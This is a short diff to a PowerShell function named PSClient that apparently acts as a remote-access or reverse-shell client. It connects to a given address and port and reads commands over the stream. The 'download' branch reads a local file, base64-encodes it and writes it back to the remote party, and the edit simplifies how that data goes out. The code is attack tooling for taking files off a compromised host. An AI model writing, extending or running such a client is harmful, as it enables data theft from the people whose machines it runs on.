@@ -32,9 +32,6 @@ function PSClient($addr,$port)
 
             if($intake)
             {
-                
-                #[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($base64string))
-
                 if($intake | Select-String 'send')
                 {
                     $filename = $intake.Split('#')[1] 
@@ -45,14 +42,12 @@ function PSClient($addr,$port)
                 if($intake | Select-String 'download')
                 {
                     $fileName = $intake.Split(' ')[1]
-                    Write-Host "DOWNLOAD"
                     if(Test-Path $fileName)
                     {
                         $filename = Split-Path $filename -leaf
                         $data = Get-Content $filename -Encoding Byte
                         $data = [System.Convert]::ToBase64String($data)
-                        $file = "send#$filename#$data"
-                        $transmitter.WriteLine($file)
+                        $transmitter.WriteLine($data)
                         $transmitter.Flush()
                     }
                     else 
